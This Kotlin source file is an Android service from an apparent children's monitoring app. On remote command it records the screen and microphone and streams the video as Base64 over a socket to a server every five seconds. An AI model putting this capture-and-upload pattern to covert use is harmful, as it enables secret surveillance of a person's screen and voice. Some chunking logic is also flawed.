package com.xixfamily.kids.service

import android.app.*
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import androidx.core.app.NotificationCompat
import com.xixfamily.kids.R
import com.xixfamily.kids.network.SocketManager
import com.xixfamily.kids.utils.PreferenceManager
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileInputStream
import java.text.SimpleDateFormat
import java.util.*

class ScreenRecorderService : Service() {

    companion object {
        private const val TAG = "ScreenRecorder"
        private const val NOTIFICATION_ID = 4001
        private const val CHANNEL_ID = "screen_recorder"

        var isRecording = false
            private set
        var currentRecordingPath: String? = null
            private set
        
        private var mediaProjection: MediaProjection? = null
        private var mediaProjectionIntent: Intent? = null
        private var mediaProjectionResultCode: Int = 0
    }

    private lateinit var prefs: PreferenceManager
    private lateinit var windowManager: WindowManager
    private var mediaRecorder: MediaRecorder? = null
    private var virtualDisplay: android.hardware.display.VirtualDisplay? = null
    private var recordingHandler: Handler? = null
    private var recordingRunnable: Runnable? = null
    private var maxDurationMs = 30000L // 30 seconds default

    override fun onCreate() {
        super.onCreate()
        prefs = PreferenceManager.getInstance(this)
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification("Screen recorder ready"))
        Log.d(TAG, "ScreenRecorderService created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "INIT" -> {
                mediaProjectionIntent = intent.getParcelableExtra("mediaProjectionIntent")
                mediaProjectionResultCode = intent.getIntExtra("mediaProjectionResultCode", 0)
                maxDurationMs = intent.getLongExtra("maxDuration", 30000)
            }
            "START" -> startRecording()
            "STOP" -> stopRecording()
            "CHUNK" -> sendRecordingChunk()
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startRecording() {
        if (isRecording) return
        isRecording = true

        try {
            val manager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            if (mediaProjection == null && mediaProjectionIntent != null) {
                mediaProjection = manager.getMediaProjection(
                    mediaProjectionResultCode,
                    mediaProjectionIntent!!
                )
            }

            val projection = mediaProjection ?: run {
                Log.e(TAG, "MediaProjection not initialized")
                isRecording = false
                return
            }

            val metrics = DisplayMetrics()
            windowManager.defaultDisplay.getRealMetrics(metrics)

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val fileName = "screen_record_$timestamp.mp4"
            val recordingsDir = File(cacheDir, "recordings")
            if (!recordingsDir.exists()) recordingsDir.mkdirs()
            val outputFile = File(recordingsDir, fileName)
            currentRecordingPath = outputFile.absolutePath

            // Use lower resolution for streaming efficiency
            val width = metrics.widthPixels / 2
            val height = metrics.heightPixels / 2
            val density = metrics.densityDpi

            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setOutputFile(outputFile.absolutePath)
                setVideoEncodingBitRate(500000) // 500 kbps for streaming
                setVideoFrameRate(15) // 15 fps
                setVideoSize(width, height)
                setAudioEncodingBitRate(32000)
                setAudioSamplingRate(8000)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                prepare()
            }

            virtualDisplay = projection.createVirtualDisplay(
                "ScreenRecorder",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder?.surface, null, null
            )

            mediaRecorder?.start()
            Log.d(TAG, "Screen recording started: ${outputFile.absolutePath}")

            // Auto-stop after max duration
            recordingHandler = Handler(Looper.getMainLooper())
            recordingRunnable = Runnable {
                stopRecording()
            }
            recordingHandler?.postDelayed(recordingRunnable!!, maxDurationMs)

            // Send chunk periodically during recording
            sendRecordingChunk()

        } catch (e: Exception) {
            Log.e(TAG, "Error starting recording: ${e.message}")
            isRecording = false
        }
    }

    private fun sendRecordingChunk() {
        if (!isRecording || currentRecordingPath == null) {
            return
        }

        try {
            val file = File(currentRecordingPath!!)
            if (!file.exists()) return

            val fis = FileInputStream(file)
            val baos = ByteArrayOutputStream()
            val buffer = ByteArray(8192)
            var bytesRead: Int
            while (fis.read(buffer).also { bytesRead = it } != -1) {
                baos.write(buffer, 0, bytesRead)
            }
            fis.close()

            val videoBase64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
            baos.close()

            if (SocketManager.getInstance().isSocketConnected()) {
                SocketManager.getInstance().emit("screen:recording:frame", JSONObject().apply {
                    put("videoBase64", videoBase64)
                    put("sequence", 0)
                    put("duration", maxDurationMs)
                    put("timestamp", SimpleDateFormat(
                        "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US
                    ).apply { timeZone = TimeZone.getTimeZone("UTC") }.format(Date()))
                })
                Log.d(TAG, "Sent recording chunk (${videoBase64.length} bytes base64)")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error sending recording chunk: ${e.message}")
        }

        // Schedule next chunk
        if (isRecording) {
            recordingHandler?.postDelayed({
                sendRecordingChunk()
            }, 5000) // Send every 5 seconds
        }
    }

    private fun stopRecording() {
        if (!isRecording) return
        isRecording = false

        recordingHandler?.removeCallbacksAndMessages(null)

        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
            mediaRecorder = null
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping recorder: ${e.message}")
        }

        try {
            virtualDisplay?.release()
            virtualDisplay = null
        } catch (e: Exception) {}

        // Send final frame
        sendRecordingChunk()

        if (SocketManager.getInstance().isSocketConnected()) {
            SocketManager.getInstance().emit("screen:recording:stopped", JSONObject())
        }

        // Clean up file
        currentRecordingPath?.let { path ->
            try {
                File(path).delete()
            } catch (e: Exception) {}
        }
        currentRecordingPath = null

        Log.d(TAG, "Screen recording stopped")
    }

    override fun onDestroy() {
        stopRecording()
        super.onDestroy()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "Screen Recorder",
                NotificationManager.IMPORTANCE_LOW
            ).apply { description = "Screen recording service" }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }
    }

    private fun createNotification(text: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Screen Recorder")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
}
